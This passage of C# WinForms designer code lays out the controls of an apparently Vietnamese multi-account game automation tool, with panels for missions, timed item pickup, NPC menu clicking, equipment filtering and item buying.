		this.buttonRaovat.TabIndex = 344;
		this.buttonRaovat.Text = "Rao vặt, tuyển mem bang hội";
		this.buttonRaovat.UseVisualStyleBackColor = false;
		this.buttonRaovat.Click += new System.EventHandler(buttonRaovat_Click);
		this.groupBox6.Controls.Add(this.linkLabelHelpTinsu);
		this.groupBox6.Controls.Add(this.textBoxTimerPT);
		this.groupBox6.Controls.Add(this.checkBoxChoPTdanhsach);
		this.groupBox6.Controls.Add(this.buttonToadoPK);
		this.groupBox6.Controls.Add(this.checkBoxChayPKNguoidung);
		this.groupBox6.Controls.Add(this.checkBoxChaydanhvong);
		this.groupBox6.Controls.Add(this.buttonTinsuAll);
		this.groupBox6.Controls.Add(this.checkBoxChayTinsu);
		this.groupBox6.Controls.Add(this.comboBoxTinSu);
		this.groupBox6.Controls.Add(this.checkBoxMuathuocPK);
		this.groupBox6.Location = new System.Drawing.Point(253, 1);
		this.groupBox6.Name = "groupBox6";
		this.groupBox6.Size = new System.Drawing.Size(136, 261);
		this.groupBox6.TabIndex = 205;
		this.groupBox6.TabStop = false;
		this.groupBox6.Text = "Chạy Tín sứ";
		this.linkLabelHelpTinsu.AutoSize = true;
		this.linkLabelHelpTinsu.Location = new System.Drawing.Point(15, 229);
		this.linkLabelHelpTinsu.Name = "linkLabelHelpTinsu";
		this.linkLabelHelpTinsu.Size = new System.Drawing.Size(104, 15);
		this.linkLabelHelpTinsu.TabIndex = 207;
		this.linkLabelHelpTinsu.TabStop = true;
		this.linkLabelHelpTinsu.Text = "Hướng dẫn cụ thể";
		this.linkLabelHelpTinsu.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabelHelpTinsu_LinkClicked);
		this.textBoxTimerPT.ForeColor = System.Drawing.Color.DarkRed;
		this.textBoxTimerPT.Location = new System.Drawing.Point(100, 69);
		this.textBoxTimerPT.Name = "textBoxTimerPT";
		this.textBoxTimerPT.Size = new System.Drawing.Size(24, 21);
		this.textBoxTimerPT.TabIndex = 206;
		this.textBoxTimerPT.TextChanged += new System.EventHandler(textBoxTimerPT_TextChanged);
		this.checkBoxChoPTdanhsach.AutoSize = true;
		this.checkBoxChoPTdanhsach.ForeColor = System.Drawing.Color.DarkRed;
		this.checkBoxChoPTdanhsach.Location = new System.Drawing.Point(6, 72);
		this.checkBoxChoPTdanhsach.Name = "checkBoxChoPTdanhsach";
		this.checkBoxChoPTdanhsach.Size = new System.Drawing.Size(100, 19);
		this.checkBoxChoPTdanhsach.TabIndex = 204;
		this.checkBoxChoPTdanhsach.Text = "Chờ đủ PT (s)";
		this.checkBoxChoPTdanhsach.UseVisualStyleBackColor = true;
		this.checkBoxChoPTdanhsach.CheckedChanged += new System.EventHandler(checkBoxChoPTdanhsach_CheckedChanged);
		this.buttonToadoPK.Location = new System.Drawing.Point(56, 115);
		this.buttonToadoPK.Name = "buttonToadoPK";
		this.buttonToadoPK.Size = new System.Drawing.Size(67, 21);
		this.buttonToadoPK.TabIndex = 7;
		this.buttonToadoPK.Text = "theo t. độ";
		this.buttonToadoPK.UseVisualStyleBackColor = true;
		this.buttonToadoPK.Click += new System.EventHandler(buttonToadoPK_Click);
		this.checkBoxChayPKNguoidung.AutoSize = true;
		this.checkBoxChayPKNguoidung.ForeColor = System.Drawing.Color.Black;
		this.checkBoxChayPKNguoidung.Location = new System.Drawing.Point(6, 117);
		this.checkBoxChayPKNguoidung.Name = "checkBoxChayPKNguoidung";
		this.checkBoxChayPKNguoidung.Size = new System.Drawing.Size(53, 19);
		this.checkBoxChayPKNguoidung.TabIndex = 6;
		this.checkBoxChayPKNguoidung.Text = "Chạy";
		this.checkBoxChayPKNguoidung.UseVisualStyleBackColor = true;
		this.checkBoxChayPKNguoidung.CheckedChanged += new System.EventHandler(checkBoxChayPKNguoidung_CheckedChanged);
		this.checkBoxChaydanhvong.AutoSize = true;
		this.checkBoxChaydanhvong.Location = new System.Drawing.Point(6, 94);
		this.checkBoxChaydanhvong.Name = "checkBoxChaydanhvong";
		this.checkBoxChaydanhvong.Size = new System.Drawing.Size(132, 19);
		this.checkBoxChaydanhvong.TabIndex = 1;
		this.checkBoxChaydanhvong.Text = "Chỉ chạy danh vọng";
		this.checkBoxChaydanhvong.UseVisualStyleBackColor = true;
		this.checkBoxChaydanhvong.CheckedChanged += new System.EventHandler(checkBoxChaydanhvong_CheckedChanged);
		this.buttonTinsuAll.ForeColor = System.Drawing.Color.Red;
		this.buttonTinsuAll.Location = new System.Drawing.Point(6, 168);
		this.buttonTinsuAll.Name = "buttonTinsuAll";
		this.buttonTinsuAll.Size = new System.Drawing.Size(115, 59);
		this.buttonTinsuAll.TabIndex = 203;
		this.buttonTinsuAll.Text = "Áp dụng tất cả ac";
		this.buttonTinsuAll.UseVisualStyleBackColor = true;
		this.buttonTinsuAll.Click += new System.EventHandler(buttonTinsuAll_Click);
		this.checkBoxChayTinsu.AutoSize = true;
		this.checkBoxChayTinsu.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.checkBoxChayTinsu.ForeColor = System.Drawing.SystemColors.MenuHighlight;
		this.checkBoxChayTinsu.Location = new System.Drawing.Point(6, 144);
		this.checkBoxChayTinsu.Name = "checkBoxChayTinsu";
		this.checkBoxChayTinsu.Size = new System.Drawing.Size(102, 17);
		this.checkBoxChayTinsu.TabIndex = 7;
		this.checkBoxChayTinsu.Text = "Bắt đầu chạy";
		this.checkBoxChayTinsu.UseVisualStyleBackColor = true;
		this.checkBoxChayTinsu.CheckedChanged += new System.EventHandler(checkBoxChayTinsu_CheckedChanged);
		this.comboBoxTinSu.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxTinSu.DropDownWidth = 80;
		this.comboBoxTinSu.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTinSu.FormattingEnabled = true;
		this.comboBoxTinSu.Location = new System.Drawing.Point(8, 21);
		this.comboBoxTinSu.Name = "comboBoxTinSu";
		this.comboBoxTinSu.Size = new System.Drawing.Size(105, 23);
		this.comboBoxTinSu.TabIndex = 163;
		this.comboBoxTinSu.SelectedIndexChanged += new System.EventHandler(comboBoxTinSu_SelectedIndexChanged);
		this.checkBoxMuathuocPK.AutoSize = true;
		this.checkBoxMuathuocPK.Location = new System.Drawing.Point(6, 51);
		this.checkBoxMuathuocPK.Name = "checkBoxMuathuocPK";
		this.checkBoxMuathuocPK.Size = new System.Drawing.Size(102, 19);
		this.checkBoxMuathuocPK.TabIndex = 2;
		this.checkBoxMuathuocPK.Text = "Có mua thuốc";
		this.checkBoxMuathuocPK.UseVisualStyleBackColor = true;
		this.checkBoxMuathuocPK.CheckedChanged += new System.EventHandler(checkBoxMuathuocPK_CheckedChanged);
		this.groupBox4.Controls.Add(this.comboBoxNhatQua);
		this.groupBox4.Controls.Add(this.buttonResetTenNhatQua);
		this.groupBox4.Controls.Add(this.checkBoxDungCodinh);
		this.groupBox4.Controls.Add(this.textBoxThoiGianTruot);
		this.groupBox4.Controls.Add(this.buttonStopNhatqua);
		this.groupBox4.Controls.Add(this.textBoxPhamviNhatqua);
		this.groupBox4.Controls.Add(this.numericUpDownHH);
		this.groupBox4.Controls.Add(this.buttonNhatquaAll);
		this.groupBox4.Controls.Add(this.checkBoxNhatqua);
		this.groupBox4.Controls.Add(this.checkBoxThanhTruot);
		this.groupBox4.Controls.Add(this.numericUpDownMM);
		this.groupBox4.Controls.Add(this.checkBoxGioClick);
		this.groupBox4.Controls.Add(this.numericUpDownSS);
		this.groupBox4.Location = new System.Drawing.Point(0, 1);
		this.groupBox4.Name = "groupBox4";
		this.groupBox4.Size = new System.Drawing.Size(250, 189);
		this.groupBox4.TabIndex = 203;
		this.groupBox4.TabStop = false;
		this.groupBox4.Text = "Nhặt Quả Hoàng Kim, hộp event...";
		this.comboBoxNhatQua.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxNhatQua.DropDownWidth = 150;
		this.comboBoxNhatQua.ForeColor = System.Drawing.Color.Black;
		this.comboBoxNhatQua.FormattingEnabled = true;
		this.comboBoxNhatQua.Location = new System.Drawing.Point(8, 21);
		this.comboBoxNhatQua.Name = "comboBoxNhatQua";
		this.comboBoxNhatQua.Size = new System.Drawing.Size(86, 23);
		this.comboBoxNhatQua.TabIndex = 209;
		this.comboBoxNhatQua.SelectedIndexChanged += new System.EventHandler(comboBoxNhatQua_SelectedIndexChanged);
		this.comboBoxNhatQua.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxNhatQua_MouseDown);
		this.buttonResetTenNhatQua.Location = new System.Drawing.Point(97, 21);
		this.buttonResetTenNhatQua.Name = "buttonResetTenNhatQua";
		this.buttonResetTenNhatQua.Size = new System.Drawing.Size(18, 20);
		this.buttonResetTenNhatQua.TabIndex = 208;
		this.buttonResetTenNhatQua.Text = "X";
		this.buttonResetTenNhatQua.UseVisualStyleBackColor = true;
		this.buttonResetTenNhatQua.Click += new System.EventHandler(buttonResetTenNhatQua_Click);
		this.checkBoxDungCodinh.AutoSize = true;
		this.checkBoxDungCodinh.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxDungCodinh.ForeColor = System.Drawing.Color.Black;
		this.checkBoxDungCodinh.Location = new System.Drawing.Point(120, 24);
		this.checkBoxDungCodinh.Name = "checkBoxDungCodinh";
		this.checkBoxDungCodinh.Size = new System.Drawing.Size(84, 17);
		this.checkBoxDungCodinh.TabIndex = 210;
		this.checkBoxDungCodinh.Text = "Quanh điểm";
		this.checkBoxDungCodinh.UseVisualStyleBackColor = true;
		this.checkBoxDungCodinh.CheckedChanged += new System.EventHandler(checkBoxDungCodinh_CheckedChanged);
		this.textBoxThoiGianTruot.Location = new System.Drawing.Point(204, 47);
		this.textBoxThoiGianTruot.Name = "textBoxThoiGianTruot";
		this.textBoxThoiGianTruot.Size = new System.Drawing.Size(40, 21);
		this.textBoxThoiGianTruot.TabIndex = 208;
		this.textBoxThoiGianTruot.TextChanged += new System.EventHandler(textBoxThoiGianTruot_TextChanged);
		this.buttonStopNhatqua.ForeColor = System.Drawing.Color.Blue;
		this.buttonStopNhatqua.Location = new System.Drawing.Point(4, 124);
		this.buttonStopNhatqua.Name = "buttonStopNhatqua";
		this.buttonStopNhatqua.Size = new System.Drawing.Size(113, 59);
		this.buttonStopNhatqua.TabIndex = 203;
		this.buttonStopNhatqua.Text = "Dừng tất cả ac";
		this.buttonStopNhatqua.UseVisualStyleBackColor = true;
		this.buttonStopNhatqua.Click += new System.EventHandler(buttonStopNhatqua_Click);
		this.textBoxPhamviNhatqua.Location = new System.Drawing.Point(204, 22);
		this.textBoxPhamviNhatqua.Name = "textBoxPhamviNhatqua";
		this.textBoxPhamviNhatqua.Size = new System.Drawing.Size(40, 21);
		this.textBoxPhamviNhatqua.TabIndex = 204;
		this.textBoxPhamviNhatqua.TextChanged += new System.EventHandler(textBoxPhamviNhatqua_TextChanged);
		this.numericUpDownHH.Location = new System.Drawing.Point(120, 74);
		this.numericUpDownHH.Maximum = new decimal(new int[4] { 23, 0, 0, 0 });
		this.numericUpDownHH.Name = "numericUpDownHH";
		this.numericUpDownHH.Size = new System.Drawing.Size(41, 21);
		this.numericUpDownHH.TabIndex = 176;
		this.numericUpDownHH.ValueChanged += new System.EventHandler(numericUpDownHH_ValueChanged);
		this.buttonNhatquaAll.ForeColor = System.Drawing.Color.Red;
		this.buttonNhatquaAll.Location = new System.Drawing.Point(120, 124);
		this.buttonNhatquaAll.Name = "buttonNhatquaAll";
		this.buttonNhatquaAll.Size = new System.Drawing.Size(124, 59);
		this.buttonNhatquaAll.TabIndex = 202;
		this.buttonNhatquaAll.Text = "Áp dụng tất cả ac";
		this.buttonNhatquaAll.UseVisualStyleBackColor = true;
		this.buttonNhatquaAll.Click += new System.EventHandler(buttonNhatquaAll_Click);
		this.checkBoxNhatqua.AutoSize = true;
		this.checkBoxNhatqua.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.checkBoxNhatqua.ForeColor = System.Drawing.SystemColors.MenuHighlight;
		this.checkBoxNhatqua.Location = new System.Drawing.Point(8, 102);
		this.checkBoxNhatqua.Name = "checkBoxNhatqua";
		this.checkBoxNhatqua.Size = new System.Drawing.Size(191, 17);
		this.checkBoxNhatqua.TabIndex = 183;
		this.checkBoxNhatqua.Text = "Bắt đầu nhặt Acc được chọn";
		this.checkBoxNhatqua.UseVisualStyleBackColor = true;
		this.checkBoxNhatqua.CheckedChanged += new System.EventHandler(checkBoxNhatqua_CheckedChanged);
		this.checkBoxThanhTruot.AutoSize = true;
		this.checkBoxThanhTruot.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxThanhTruot.ForeColor = System.Drawing.Color.Black;
		this.checkBoxThanhTruot.Location = new System.Drawing.Point(8, 50);
		this.checkBoxThanhTruot.Name = "checkBoxThanhTruot";
		this.checkBoxThanhTruot.Size = new System.Drawing.Size(185, 17);
		this.checkBoxThanhTruot.TabIndex = 206;
		this.checkBoxThanhTruot.Text = "Có thanh trượt, thời gian trượt (ms)";
		this.checkBoxThanhTruot.UseVisualStyleBackColor = true;
		this.checkBoxThanhTruot.CheckedChanged += new System.EventHandler(checkBoxThanhTruot_CheckedChanged);
		this.numericUpDownMM.Location = new System.Drawing.Point(163, 74);
		this.numericUpDownMM.Maximum = new decimal(new int[4] { 59, 0, 0, 0 });
		this.numericUpDownMM.Name = "numericUpDownMM";
		this.numericUpDownMM.Size = new System.Drawing.Size(40, 21);
		this.numericUpDownMM.TabIndex = 177;
		this.numericUpDownMM.ValueChanged += new System.EventHandler(numericUpDownMM_ValueChanged);
		this.checkBoxGioClick.AutoSize = true;
		this.checkBoxGioClick.ForeColor = System.Drawing.Color.Black;
		this.checkBoxGioClick.Location = new System.Drawing.Point(8, 76);
		this.checkBoxGioClick.Name = "checkBoxGioClick";
		this.checkBoxGioClick.Size = new System.Drawing.Size(112, 19);
		this.checkBoxGioClick.TabIndex = 175;
		this.checkBoxGioClick.Text = "Nhặt lúc (h:m:s)";
		this.checkBoxGioClick.UseVisualStyleBackColor = true;
		this.checkBoxGioClick.CheckedChanged += new System.EventHandler(checkBoxGioClick_CheckedChanged);
		this.numericUpDownSS.Location = new System.Drawing.Point(204, 73);
		this.numericUpDownSS.Maximum = new decimal(new int[4] { 59, 0, 0, 0 });
		this.numericUpDownSS.Name = "numericUpDownSS";
		this.numericUpDownSS.Size = new System.Drawing.Size(40, 21);
		this.numericUpDownSS.TabIndex = 178;
		this.numericUpDownSS.ValueChanged += new System.EventHandler(numericUpDownSS_ValueChanged);
		this.tabPageTinhLuyen.Controls.Add(this.groupBox7);
		this.tabPageTinhLuyen.Location = new System.Drawing.Point(4, 24);
		this.tabPageTinhLuyen.Name = "tabPageTinhLuyen";
		this.tabPageTinhLuyen.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageTinhLuyen.Size = new System.Drawing.Size(382, 262);
		this.tabPageTinhLuyen.TabIndex = 3;
		this.tabPageTinhLuyen.Text = "Click Event";
		this.tabPageTinhLuyen.UseVisualStyleBackColor = true;
		this.groupBox7.Controls.Add(this.textBoxXoaMn);
		this.groupBox7.Controls.Add(this.tabControlLoc);
		this.groupBox7.Controls.Add(this.checkBoxXoaMn);
		this.groupBox7.Controls.Add(this.buttonNpcClickMenu);
		this.groupBox7.Controls.Add(this.checkBoxNhapSLClickNpc);
		this.groupBox7.Controls.Add(this.buttonClickNpcStopAll);
		this.groupBox7.Controls.Add(this.textBoxNhapSoluongClickNPC);
		this.groupBox7.Controls.Add(this.buttonClickNpcAll);
		this.groupBox7.Controls.Add(this.textBoxClickNPCSolan);
		this.groupBox7.Controls.Add(this.buttonClickNpcSingle);
		this.groupBox7.Controls.Add(this.buttonHelpClickNpc);
		this.groupBox7.Controls.Add(this.textBoxClickNPCMenu);
		this.groupBox7.Controls.Add(this.comboBoxClickNPC);
		this.groupBox7.Controls.Add(this.textBoxClickNPCTocdo);
		this.groupBox7.Controls.Add(this.checkBoxClickNPCmenu);
		this.groupBox7.Controls.Add(this.buttonThietlapClickNpc);
		this.groupBox7.Controls.Add(this.checkBoxNPC);
		this.groupBox7.Controls.Add(this.label2);
		this.groupBox7.Controls.Add(this.checkBoxClickNPCSolan);
		this.groupBox7.Location = new System.Drawing.Point(0, 0);
		this.groupBox7.Name = "groupBox7";
		this.groupBox7.Size = new System.Drawing.Size(389, 333);
		this.groupBox7.TabIndex = 176;
		this.groupBox7.TabStop = false;
		this.groupBox7.Text = "_click";
		this.textBoxXoaMn.ForeColor = System.Drawing.Color.Black;
		this.textBoxXoaMn.Location = new System.Drawing.Point(188, 58);
		this.textBoxXoaMn.Name = "textBoxXoaMn";
		this.textBoxXoaMn.Size = new System.Drawing.Size(60, 21);
		this.textBoxXoaMn.TabIndex = 349;
		this.textBoxXoaMn.TextChanged += new System.EventHandler(textBoxXoaMn_TextChanged);
		this.tabControlLoc.Controls.Add(this.tabPageLocTrangbi);
		this.tabControlLoc.Controls.Add(this.tabPageMuaDung);
		this.tabControlLoc.Controls.Add(this.tabPage15);
		this.tabControlLoc.Controls.Add(this.tabPage12);
		this.tabControlLoc.Location = new System.Drawing.Point(3, 103);
		this.tabControlLoc.Margin = new System.Windows.Forms.Padding(0);
		this.tabControlLoc.Name = "tabControlLoc";
		this.tabControlLoc.SelectedIndex = 0;
		this.tabControlLoc.Size = new System.Drawing.Size(387, 184);
		this.tabControlLoc.TabIndex = 175;
		this.tabPageLocTrangbi.Controls.Add(this.buttonMenuLocClick);
		this.tabPageLocTrangbi.Controls.Add(this.textBoxLocTocdo);
		this.tabPageLocTrangbi.Controls.Add(this.label31);
		this.tabPageLocTrangbi.Controls.Add(this.textBoxNhapSLTest);
		this.tabPageLocTrangbi.Controls.Add(this.buttonPhimHDLoc);
		this.tabPageLocTrangbi.Controls.Add(this.buttonLocTrangbi);
		this.tabPageLocTrangbi.Controls.Add(this.buttonDungTatcaTrangbiTest);
		this.tabPageLocTrangbi.Controls.Add(this.textBoxMenuTest);
		this.tabPageLocTrangbi.Controls.Add(this.buttonTatcaNhanTrangbiTest);
		this.tabPageLocTrangbi.Controls.Add(this.buttonNhanTrangbiTest);
		this.tabPageLocTrangbi.Controls.Add(this.checkBoxLocTrangbiNhapSL);
		this.tabPageLocTrangbi.Controls.Add(this.comboBoxTrangbiTest);
		this.tabPageLocTrangbi.Controls.Add(this.checkBoxLocTrangbiNPC);
		this.tabPageLocTrangbi.Controls.Add(this.label33);
		this.tabPageLocTrangbi.Controls.Add(this.label32);
		this.tabPageLocTrangbi.Location = new System.Drawing.Point(4, 24);
		this.tabPageLocTrangbi.Name = "tabPageLocTrangbi";
		this.tabPageLocTrangbi.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageLocTrangbi.Size = new System.Drawing.Size(379, 156);
		this.tabPageLocTrangbi.TabIndex = 4;
		this.tabPageLocTrangbi.Text = "Lọc trang bị";
		this.tabPageLocTrangbi.UseVisualStyleBackColor = true;
		this.buttonMenuLocClick.ForeColor = System.Drawing.Color.DarkGreen;
		this.buttonMenuLocClick.Location = new System.Drawing.Point(96, 27);
		this.buttonMenuLocClick.Name = "buttonMenuLocClick";
		this.buttonMenuLocClick.Size = new System.Drawing.Size(85, 23);
		this.buttonMenuLocClick.TabIndex = 342;
		this.buttonMenuLocClick.Text = "click dòng =>";
		this.buttonMenuLocClick.UseVisualStyleBackColor = true;
		this.buttonMenuLocClick.Click += new System.EventHandler(buttonMenuLocClick_Click);
		this.textBoxLocTocdo.ForeColor = System.Drawing.Color.Black;
		this.textBoxLocTocdo.Location = new System.Drawing.Point(97, 59);
		this.textBoxLocTocdo.Name = "textBoxLocTocdo";
		this.textBoxLocTocdo.Size = new System.Drawing.Size(32, 21);
		this.textBoxLocTocdo.TabIndex = 200;
		this.textBoxLocTocdo.TextChanged += new System.EventHandler(textBoxLocTocdo_TextChanged);
		this.label31.AutoSize = true;
		this.label31.Location = new System.Drawing.Point(3, 62);
		this.label31.Name = "label31";
		this.label31.Size = new System.Drawing.Size(84, 15);
		this.label31.TabIndex = 201;
		this.label31.Text = "Tốc độ Lọc đồ";
		this.textBoxNhapSLTest.ForeColor = System.Drawing.Color.Black;
		this.textBoxNhapSLTest.Location = new System.Drawing.Point(350, 29);
		this.textBoxNhapSLTest.Name = "textBoxNhapSLTest";
		this.textBoxNhapSLTest.Size = new System.Drawing.Size(23, 21);
		this.textBoxNhapSLTest.TabIndex = 195;
		this.textBoxNhapSLTest.TextChanged += new System.EventHandler(textBoxNhapSLTest_TextChanged);
		this.buttonPhimHDLoc.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.buttonPhimHDLoc.ForeColor = System.Drawing.Color.MediumBlue;
		this.buttonPhimHDLoc.Location = new System.Drawing.Point(171, 84);
		this.buttonPhimHDLoc.Name = "buttonPhimHDLoc";
		this.buttonPhimHDLoc.Size = new System.Drawing.Size(202, 59);
		this.buttonPhimHDLoc.TabIndex = 189;
		this.buttonPhimHDLoc.Text = "tốc độ nên để 50, nếu để ít hơn dễ bị diss game. Chúc các bạn trải nghiệm vui vẻ!!!";
		this.buttonPhimHDLoc.UseVisualStyleBackColor = true;
		this.buttonPhimHDLoc.Click += new System.EventHandler(buttonPhimHDLoc_Click);
		this.buttonLocTrangbi.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonLocTrangbi.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonLocTrangbi.ForeColor = System.Drawing.Color.Black;
		this.buttonLocTrangbi.Location = new System.Drawing.Point(4, 82);
		this.buttonLocTrangbi.Name = "buttonLocTrangbi";
		this.buttonLocTrangbi.Size = new System.Drawing.Size(161, 57);
		this.buttonLocTrangbi.TabIndex = 192;
		this.buttonLocTrangbi.Text = "Thiết lập điều kiện lọc đồ tùy chọn, sét cho kỹ nha AE";
		this.buttonLocTrangbi.UseVisualStyleBackColor = false;
		this.buttonLocTrangbi.Click += new System.EventHandler(buttonLocTrangbi_Click);
		this.buttonDungTatcaTrangbiTest.ForeColor = System.Drawing.Color.Black;
		this.buttonDungTatcaTrangbiTest.Location = new System.Drawing.Point(294, 56);
		this.buttonDungTatcaTrangbiTest.Name = "buttonDungTatcaTrangbiTest";
		this.buttonDungTatcaTrangbiTest.Size = new System.Drawing.Size(80, 26);
		this.buttonDungTatcaTrangbiTest.TabIndex = 190;
		this.buttonDungTatcaTrangbiTest.Text = "Dừng tất cả";
		this.buttonDungTatcaTrangbiTest.UseVisualStyleBackColor = true;
		this.buttonDungTatcaTrangbiTest.Click += new System.EventHandler(buttonDungTatcaTrangbiTest_Click);
		this.textBoxMenuTest.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxMenuTest.ForeColor = System.Drawing.Color.DarkGreen;
		this.textBoxMenuTest.Location = new System.Drawing.Point(183, 29);
		this.textBoxMenuTest.Name = "textBoxMenuTest";
		this.textBoxMenuTest.Size = new System.Drawing.Size(57, 21);
		this.textBoxMenuTest.TabIndex = 189;
		this.textBoxMenuTest.TextChanged += new System.EventHandler(textBoxMenuTest_TextChanged);
		this.buttonTatcaNhanTrangbiTest.ForeColor = System.Drawing.Color.Red;
		this.buttonTatcaNhanTrangbiTest.Location = new System.Drawing.Point(213, 56);
		this.buttonTatcaNhanTrangbiTest.Name = "buttonTatcaNhanTrangbiTest";
		this.buttonTatcaNhanTrangbiTest.Size = new System.Drawing.Size(80, 26);
		this.buttonTatcaNhanTrangbiTest.TabIndex = 191;
		this.buttonTatcaNhanTrangbiTest.Text = "Tất cả lọc";
		this.buttonTatcaNhanTrangbiTest.UseVisualStyleBackColor = true;
		this.buttonTatcaNhanTrangbiTest.Click += new System.EventHandler(buttonTatcaNhanTrangbiTest_Click);
		this.buttonNhanTrangbiTest.Location = new System.Drawing.Point(132, 56);
		this.buttonNhanTrangbiTest.Name = "buttonNhanTrangbiTest";
		this.buttonNhanTrangbiTest.Size = new System.Drawing.Size(80, 26);
		this.buttonNhanTrangbiTest.TabIndex = 189;
		this.buttonNhanTrangbiTest.Text = "Bắt đầu lọc";
		this.buttonNhanTrangbiTest.UseVisualStyleBackColor = true;
		this.buttonNhanTrangbiTest.Click += new System.EventHandler(buttonNhanTrangbiTest_Click);
		this.checkBoxLocTrangbiNhapSL.AutoSize = true;
		this.checkBoxLocTrangbiNhapSL.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxLocTrangbiNhapSL.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxLocTrangbiNhapSL.Location = new System.Drawing.Point(243, 32);
		this.checkBoxLocTrangbiNhapSL.Name = "checkBoxLocTrangbiNhapSL";
		this.checkBoxLocTrangbiNhapSL.Size = new System.Drawing.Size(110, 17);
		this.checkBoxLocTrangbiNhapSL.TabIndex = 199;
		this.checkBoxLocTrangbiNhapSL.Text = "Nhập số lượng =>";
		this.checkBoxLocTrangbiNhapSL.UseVisualStyleBackColor = false;
		this.checkBoxLocTrangbiNhapSL.CheckedChanged += new System.EventHandler(checkBoxLocTrangbiNhapSL_CheckedChanged);
		this.comboBoxTrangbiTest.DropDownWidth = 110;
		this.comboBoxTrangbiTest.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTrangbiTest.FormattingEnabled = true;
		this.comboBoxTrangbiTest.Location = new System.Drawing.Point(270, 3);
		this.comboBoxTrangbiTest.Name = "comboBoxTrangbiTest";
		this.comboBoxTrangbiTest.Size = new System.Drawing.Size(103, 23);
		this.comboBoxTrangbiTest.TabIndex = 189;
		this.comboBoxTrangbiTest.SelectedIndexChanged += new System.EventHandler(comboBoxTrangbiTest_SelectedIndexChanged);
		this.comboBoxTrangbiTest.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxTrangbiTest_MouseDown);
		this.checkBoxLocTrangbiNPC.AutoSize = true;
		this.checkBoxLocTrangbiNPC.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxLocTrangbiNPC.ForeColor = System.Drawing.Color.Red;
		this.checkBoxLocTrangbiNPC.Location = new System.Drawing.Point(129, 6);
		this.checkBoxLocTrangbiNPC.Name = "checkBoxLocTrangbiNPC";
		this.checkBoxLocTrangbiNPC.Size = new System.Drawing.Size(136, 19);
		this.checkBoxLocTrangbiNPC.TabIndex = 198;
		this.checkBoxLocTrangbiNPC.Text = "Đây là Npc click ==>";
		this.checkBoxLocTrangbiNPC.UseVisualStyleBackColor = false;
		this.checkBoxLocTrangbiNPC.CheckedChanged += new System.EventHandler(checkBoxLocTrangbiNPC_CheckedChanged);
		this.label33.AutoSize = true;
		this.label33.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.label33.ForeColor = System.Drawing.Color.Black;
		this.label33.Location = new System.Drawing.Point(3, 31);
		this.label33.Name = "label33";
		this.label33.Size = new System.Drawing.Size(95, 13);
		this.label33.TabIndex = 191;
		this.label33.Text = "Có click vào menu";
		this.label32.AutoSize = true;
		this.label32.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.label32.ForeColor = System.Drawing.Color.Red;
		this.label32.Location = new System.Drawing.Point(1, 7);
		this.label32.Name = "label32";
		this.label32.Size = new System.Drawing.Size(127, 13);
		this.label32.TabIndex = 190;
		this.label32.Text = "Vật phẩm mở trang bị test";
		this.tabPageMuaDung.Controls.Add(this.buttonBatdauSudung);
		this.tabPageMuaDung.Controls.Add(this.buttonBatdauMua);
		this.tabPageMuaDung.Controls.Add(this.buttonStopSudungAll);
		this.tabPageMuaDung.Controls.Add(this.buttonMuaSudungAll);
		this.tabPageMuaDung.Controls.Add(this.buttonMuaGopAll);
		this.tabPageMuaDung.Controls.Add(this.buttonStopSudung);
		this.tabPageMuaDung.Controls.Add(this.textBoxMuadungSoLuong);
		this.tabPageMuaDung.Controls.Add(this.textBoxIdMua);
		this.tabPageMuaDung.Controls.Add(this.linkLabelPhimCauca);
		this.tabPageMuaDung.Controls.Add(this.checkBoxThanhTruotSudung);
		this.tabPageMuaDung.Controls.Add(this.buttonHelpMua);
		this.tabPageMuaDung.Controls.Add(this.checkBoxBoquaMaKTC);
		this.tabPageMuaDung.Controls.Add(this.checkBoxMuaDungSoluong);
		this.tabPageMuaDung.Controls.Add(this.comboBoxMuaVatpham);
		this.tabPageMuaDung.Controls.Add(this.label16);
		this.tabPageMuaDung.Controls.Add(this.checkBoxGopVatpham);
		this.tabPageMuaDung.Controls.Add(this.checkBoxMuaKytrancac);
		this.tabPageMuaDung.Location = new System.Drawing.Point(4, 24);
		this.tabPageMuaDung.Name = "tabPageMuaDung";
		this.tabPageMuaDung.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageMuaDung.Size = new System.Drawing.Size(379, 156);
		this.tabPageMuaDung.TabIndex = 2;
		this.tabPageMuaDung.Text = "Mua dùng";
		this.tabPageMuaDung.UseVisualStyleBackColor = true;
		this.buttonBatdauSudung.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonBatdauSudung.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonBatdauSudung.ForeColor = System.Drawing.Color.Black;
		this.buttonBatdauSudung.Location = new System.Drawing.Point(127, 74);
		this.buttonBatdauSudung.Name = "buttonBatdauSudung";
		this.buttonBatdauSudung.Size = new System.Drawing.Size(60, 65);
		this.buttonBatdauSudung.TabIndex = 351;
		this.buttonBatdauSudung.Text = "Sử dụng";
		this.buttonBatdauSudung.UseVisualStyleBackColor = false;
		this.buttonBatdauSudung.Click += new System.EventHandler(buttonBatdauSudung_Click);
		this.buttonBatdauMua.BackColor = System.Drawing.Color.DarkSeaGreen;
